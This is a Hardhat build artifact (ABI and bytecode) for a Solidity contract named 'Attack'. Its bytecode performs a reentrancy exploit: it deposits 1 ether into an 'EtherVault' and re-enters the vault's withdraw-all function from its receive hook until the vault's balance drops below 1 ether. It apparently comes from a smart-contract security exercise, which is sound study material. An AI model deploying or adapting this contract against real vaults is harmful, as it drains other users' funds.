{
  "_format": "hh-sol-artifact-1",
  "contractName": "Attack",
  "sourceName": "contracts/Attack.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract IEtherVault",
          "name": "_etherVault",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "etherVault",
      "outputs": [
        {
          "internalType": "contract IEtherVault",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x60a060405234801561001057600080fd5b506040516105b03803806105b0833981810160405281019061003291906100e1565b8073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff16815250505061010e565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061009c82610071565b9050919050565b60006100ae82610091565b9050919050565b6100be816100a3565b81146100c957600080fd5b50565b6000815190506100db816100b5565b92915050565b6000602082840312156100f7576100f661006c565b5b6000610105848285016100cc565b91505092915050565b60805161046d610143600039600081816048015281816085015281816101bf0152818161024801526102ca015261046d6000f3fe6080604052600436106100385760003560e01c806312065fe01461010b5780639e5faafc14610136578063bc6548fb1461014057610106565b3661010657670de0b6b3a76400007f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163110610104577f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663853828b66040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100eb57600080fd5b505af11580156100ff573d6000803e3d6000fd5b505050505b005b600080fd5b34801561011757600080fd5b5061012061016b565b60405161012d9190610305565b60405180910390f35b61013e610173565b005b34801561014c57600080fd5b506101556102c8565b604051610162919061039f565b60405180910390f35b600047905090565b670de0b6b3a764000034146101bd576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101b490610417565b60405180910390fd5b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561022d57600080fd5b505af1158015610241573d6000803e3d6000fd5b50505050507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663853828b66040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156102ae57600080fd5b505af11580156102c2573d6000803e3d6000fd5b50505050565b7f000000000000000000000000000000000000000000000000000000000000000081565b6000819050919050565b6102ff816102ec565b82525050565b600060208201905061031a60008301846102f6565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061036561036061035b84610320565b610340565b610320565b9050919050565b60006103778261034a565b9050919050565b60006103898261036c565b9050919050565b6103998161037e565b82525050565b60006020820190506103b46000830184610390565b92915050565b600082825260208201905092915050565b7f52657175697265203120457468657220746f2061747461636b00000000000000600082015250565b60006104016019836103ba565b915061040c826103cb565b602082019050919050565b60006020820190508181036000830152610430816103f4565b905091905056fea264697066735822122095acd4196950fbfbfc1113f69b919d063f04935c6a39be22516280be2206095364736f6c63430008090033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}